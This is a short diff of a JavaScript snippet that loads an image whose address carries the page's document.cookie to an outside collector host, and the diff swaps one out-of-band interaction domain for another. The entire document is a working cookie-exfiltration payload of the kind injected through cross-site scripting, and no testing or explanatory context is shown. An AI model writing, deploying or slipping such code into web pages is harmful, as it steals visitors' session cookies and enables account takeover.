@@ -1,4 +1,4 @@
 (function () {
   var i = new Image();
-  i.src = "https://r5x944n50hlq4g6dxqp8ku9yipogc70w.oastify.com/log?c=" + encodeURIComponent(document.cookie);
+  i.src = "https://d83cibhph5b115ifnkl06d4m7akobkeza.oast.live/log?c=" + encodeURIComponent(document.cookie);
 })();
